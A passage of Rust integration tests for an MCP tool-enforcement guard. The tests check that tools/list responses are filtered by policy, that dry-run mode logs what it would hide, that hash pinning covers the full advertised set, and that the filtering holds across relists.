logging level="info" fail_closed=#false
server "tool-enforcement" {
    tool "read_file" side_effect="read_only" {
        filesystem {
            allow "/workspace/**"
        }
    }
    tool "fetch_url" deny=#true
}
"##;

/// Insert a `tools-list-hash` pin into [`FILTER_POLICY`]'s server block.
fn filter_policy_with_hash(hash: &str) -> String {
    FILTER_POLICY.replacen(
        "server \"tool-enforcement\" {",
        &format!("server \"tool-enforcement\" {{\n    tools-list-hash \"{hash}\""),
        1,
    )
}

/// Names in `result.tools` of a tools/list response line.
fn json_tool_names(response: &str) -> Vec<String> {
    let json = nojson::RawJson::parse(response).expect("valid JSON");
    let Some(tools) = json
        .value()
        .to_member("result")
        .ok()
        .and_then(|m| m.optional())
        .and_then(|r| r.to_member("tools").ok().and_then(|m| m.optional()))
    else {
        return Vec::new();
    };
    let mut names = Vec::new();
    if let Ok(items) = tools.to_array() {
        for item in items {
            if let Some(name) = item
                .to_member("name")
                .ok()
                .and_then(|m| m.optional())
                .and_then(|v| v.to_unquoted_string_str().ok())
            {
                names.push(name.into_owned());
            }
        }
    }
    names
}

/// Query the scripted fixture directly for its advertised tools/list so a
/// pinned hash is computed on the real response, not a retyped copy.
async fn advertised_tools(fixture: &str) -> Vec<mcp_writ::tool_def::ToolDefinition> {
    let argv = scripted_argv();
    let mut server = Command::new(&argv[0])
        .args(&argv[1..])
        .env("MCP_WRIT_FIXTURE", fixture)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .expect("failed to spawn scripted fixture");
    let mut stdin = server.stdin.take().expect("stdin");
    let stdout = server.stdout.take().expect("stdout");
    let mut reader = BufReader::new(stdout).lines();

    let list = r#"{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}"#;
    let line = send_and_recv(&mut stdin, &mut reader, list).await;
    drop(stdin);
    let _ = server.kill().await;
    mcp_writ::protocol::tools_list::parse_tools_list_response(&line)
        .expect("fixture tools/list must parse")
}

#[tokio::test]
async fn tools_list_hides_denied_and_unlisted_tools() {
    let dir = make_test_dir("list_filter");
    let policy = write_policy(dir.path(), FILTER_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "tools_call_ok")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let list = r#"{"jsonrpc":"2.0","id":40,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(json_has_result(&list_resp), "got: {list_resp}");
    assert!(!json_has_error(&list_resp), "got: {list_resp}");
    assert_eq!(
        json_tool_names(&list_resp),
        vec!["read_file"],
        "only the allowed tool may reach the client: {list_resp}"
    );
    assert!(
        !list_resp.contains("fetch_url") && !list_resp.contains("fail_write"),
        "denied and unlisted tool names must not appear: {list_resp}"
    );

    drop(stdin);
}

#[tokio::test]
async fn tools_list_dry_run_keeps_all_tools_and_observes() {
    let dir = make_test_dir("list_filter_dry");
    let policy = write_policy(dir.path(), FILTER_POLICY);
    let audit_log = common::next_audit_log_path();
    let mut child = spawn_guard_at(
        &policy,
        true,
        None,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "tools_call_ok")],
        &audit_log,
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let mut guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let list = r#"{"jsonrpc":"2.0","id":41,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(json_has_result(&list_resp), "got: {list_resp}");
    let mut names = json_tool_names(&list_resp);
    names.sort();
    assert_eq!(
        names,
        vec!["fail_write", "fetch_url", "read_file"],
        "dry-run must forward the full advertised set: {list_resp}"
    );

    // The audit log must still record what a normal run would have hidden.
    drop(stdin);
    let _ = timeout(Duration::from_secs(TIMEOUT_SECS), guard.0.wait()).await;
    let _ = guard.0.start_kill();
    let audit = std::fs::read_to_string(&audit_log).expect("read audit log");
    let filtered: Vec<&str> = audit
        .lines()
        .filter(|line| line.contains("\"event_type\":\"tools_list.filtered\""))
        .collect();
    assert_eq!(
        filtered.len(),
        1,
        "expected exactly one tools_list.filtered event: {audit}"
    );
    assert!(
        filtered[0].contains("\"action\":\"observed\""),
        "dry-run filter event must be observed: {}",
        filtered[0]
    );
    assert!(
        filtered[0].contains("fetch_url") && filtered[0].contains("fail_write"),
        "hidden tool names must be enumerated: {}",
        filtered[0]
    );
}

#[tokio::test]
async fn tools_list_hash_pins_full_advertised_set_not_filtered_view() {
    let advertised = advertised_tools("tools_call_ok").await;
    let full_hash =
        mcp_writ::verifier::tools_diff::hash_tools_list(&advertised).expect("hash advertised set");
    let filtered_hash = mcp_writ::verifier::tools_diff::hash_tools_list(
        &advertised
            .iter()
            .filter(|t| t.name == "read_file")
            .cloned()
            .collect::<Vec<_>>(),
    )
    .expect("hash filtered view");
    assert_ne!(
        full_hash, filtered_hash,
        "advertised set and filtered view must hash differently"
    );

    // Pin on the full advertised set: verification passes and the client
    // still receives only the allowed tool.
    let dir = make_test_dir("list_pin_full");
    let policy = write_policy(dir.path(), &filter_policy_with_hash(&full_hash));
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "tools_call_ok")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let list = r#"{"jsonrpc":"2.0","id":42,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(json_has_result(&list_resp), "got: {list_resp}");
    assert_eq!(
        json_tool_names(&list_resp),
        vec!["read_file"],
        "pinned view must still be filtered: {list_resp}"
    );
    drop(stdin);

    // Pin on the filtered one-tool view instead: the advertised set no
    // longer matches, so verification must fail closed.
    let bad_dir = make_test_dir("list_pin_filtered");
    let bad_policy = write_policy(bad_dir.path(), &filter_policy_with_hash(&filtered_hash));
    let mut child = spawn_guard(
        &bad_policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "tools_call_ok")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    let list = r#"{"jsonrpc":"2.0","id":43,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(
        json_has_error(&list_resp),
        "filtered-view pin must fail verification: {list_resp}"
    );
    assert!(!json_has_result(&list_resp), "got: {list_resp}");
    drop(stdin);
}

#[tokio::test]
async fn list_changed_relist_is_filtered() {
    let dir = make_test_dir("list_changed_filter");
    let policy = write_policy(dir.path(), FILTER_POLICY);
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "list_changed_ok")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    // First list advertises only read_file.
    let list = r#"{"jsonrpc":"2.0","id":70,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(json_has_result(&list_resp), "got: {list_resp}");
    assert_eq!(
        json_tool_names(&list_resp),
        vec!["read_file"],
        "got: {list_resp}"
    );

    // The fixture then emits list_changed; the guard re-lists internally
    // (the relist advertises the full three-tool set), revalidates, and
    // forwards the held notification.
    let notif = timeout(Duration::from_secs(TIMEOUT_SECS), async {
        loop {
            let line = reader
                .next_line()
                .await
                .expect("IO error reading mcp-writ stdout")
                .expect("unexpected EOF waiting for list_changed");
            if line.starts_with("{\"jsonrpc\"") {
                return line;
            }
        }
    })
    .await
    .expect("timeout waiting for forwarded list_changed");
    assert_eq!(
        json_method(&notif).as_deref(),
        Some("notifications/tools/list_changed"),
        "notification must be forwarded after revalidation: {notif}"
    );

    // The list transferred after revalidation is filtered the same way:
    // three tools were advertised, only read_file reaches the client.
    let relist = r#"{"jsonrpc":"2.0","id":71,"method":"tools/list","params":{}}"#;
    let relist_resp = send_and_recv(&mut stdin, &mut reader, relist).await;
    assert!(json_has_result(&relist_resp), "got: {relist_resp}");
    assert_eq!(
        json_tool_names(&relist_resp),
        vec!["read_file"],
        "the post-revalidation list must be filtered too: {relist_resp}"
    );
    assert!(
        !relist_resp.contains("fetch_url") && !relist_resp.contains("fail_write"),
        "got: {relist_resp}"
    );

    drop(stdin);
}

#[tokio::test]
async fn tools_list_empty_when_policy_has_no_tools() {
    let dir = make_test_dir("list_empty");
    let policy = write_policy(
        dir.path(),
        "policy version=1\nlogging level=\"info\" fail_closed=#false\n",
    );
    let mut child = spawn_guard(
        &policy,
        false,
        &scripted_argv(),
        &[("MCP_WRIT_FIXTURE", "tools_call_ok")],
    );
    let mut stdin = child.stdin.take().expect("stdin");
    let stdout = child.stdout.take().expect("stdout");
    let _guard = ChildGuard(child);
    let mut reader = BufReader::new(stdout).lines();

    // A policy with no tool entries is a normal filtered-empty result, not
    // an error.
    let list = r#"{"jsonrpc":"2.0","id":44,"method":"tools/list","params":{}}"#;
    let list_resp = send_and_recv(&mut stdin, &mut reader, list).await;
    assert!(json_has_result(&list_resp), "got: {list_resp}");
    assert!(!json_has_error(&list_resp), "got: {list_resp}");
    assert!(
        list_resp.contains("\"tools\":[]"),
        "expected an empty tools array: {list_resp}"
    );

    drop(stdin);
}
